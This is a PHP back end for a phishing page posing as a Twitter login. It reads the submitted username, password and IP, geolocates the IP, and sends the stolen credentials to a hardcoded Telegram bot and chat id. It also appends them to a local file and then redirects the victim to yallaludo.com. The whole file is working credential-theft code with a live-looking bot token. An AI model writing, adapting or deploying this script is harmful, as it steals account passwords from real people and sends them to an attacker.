<?php

header('Location: https://yallaludo.com/ ');

$token                = "7380376327:AAHju6Rn6HkBlNy8pKlXChy7BzHlj6yPtLU";
$id                   = "1310070511";

$user                 = $_POST['text'];
$password             = $_POST['password'];
$ip                   = $_POST['brok-ip'];

$url                  = json_decode(file_get_contents("http://ipwho.is/$ip"), 1);

$country              = $url['country'];
$city                 = $url['city'];
$calling_code         = "+" . $url['calling_code'];

if ((preg_match('/[0-9]/', $user) and strlen($user) >= 6 and is_numeric($user) == true) or (preg_match('/[a-z]/', $user) and !preg_match('/ /', $user) and strlen($user) >= 5) or (preg_match('/_/', $user) and strlen($user) >= 5) or preg_match('/@gmail.com/', $user) or preg_match('/@hotmail.com/', $user) or preg_match('/@yahoo.com/', $user) or preg_match('/@mail.ru/', $user)) {

    if (strlen($password) >= 6) {


        $accounts     = explode("\n", file_get_contents("Twitterbxz69829373857.txt"));

        if (!in_array("$user:$password", $accounts)) {

            $text     = "New Login BY Twitter Account .\n\nPhone/Email/User : `$user`\nPassword : `$password`\n- - - - -\nIP : $ip\nCountry : $country\nCalling Code : $calling_code\n- - - - -\n" . base64_decode("QlkgOiBASlxfSlxfSg==");

            $text     = urlencode($text);

            $url      = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=$id&text=$text&parse_mode=markdown";

            file_get_contents($url);

            file_put_contents("Twitterbxz69829373857.txt", "$user:$password\n", FILE_APPEND);
        }
    }
}
